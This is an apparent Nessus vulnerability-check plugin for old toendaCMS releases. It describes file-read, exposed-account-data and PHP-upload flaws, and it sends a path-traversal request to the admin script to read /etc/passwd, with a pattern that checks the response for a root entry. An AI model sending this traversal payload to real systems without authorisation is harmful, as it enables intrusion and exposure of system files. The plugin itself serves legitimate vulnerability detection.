#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20168);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2005-3550", "CVE-2005-3551", "CVE-2005-4422");
  script_bugtraq_id(15348, 15351);
  script_osvdb_id(20532, 20534, 20535);

  script_name(english:"toendaCMS < 0.6.2.1 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in toendaCMS < 0.6.2.1");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running toendaCMS, a content management and
weblogging system written in PHP. 

The version of toendaCMS installed on the remote host allows an
unauthenticated attacker to read arbitrary files by manipulating the
'id_user' parameter of the 'engine/admin/admin.php' script.  In
addition, it stores account and session data files in XML mode without
protection under the web root; an attacker can download these and gain
access to sensitive information such as password hashes.  Finally, if
an attacker gains administrative access, he can upload files with
arbitrary PHP code through the gallery scripts and execute them
subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"https://www.sec-consult.com/files/20051107-0_toendacms_multiplevulns.txt" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/415975/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to toendaCMS version 0.6.2.1 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/11/08");
 script_cvs_date("$Date: 2015/12/23 16:43:01 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
foreach dir (cgi_dirs()) {
  # Try to exploit one of the flaws to read /etc/passwd.
  w = http_send_recv3(method:"GET", 
    item:string(
      dir, "/engine/admin/admin.php?",
      "id_user=../../../../../../../../../etc/passwd"
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  # There's a problem if...
  if (
    # it looks like toendaCMS and...
    egrep(pattern:"<title>.*toendaCMS", string:res) &&
    # there's an entry for root.
    egrep(pattern:"root:.*:0:[01]:", string:res)
  ) {
    if (report_verbosity > 0) {
      contents = strstr(res, "../../data/tcms_user/");
      if (contents) {
        contents = contents - strstr(contents, ".xml");
        contents = contents - "../../data/tcms_user/";
      }
      else contents = res;

      report = string(
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
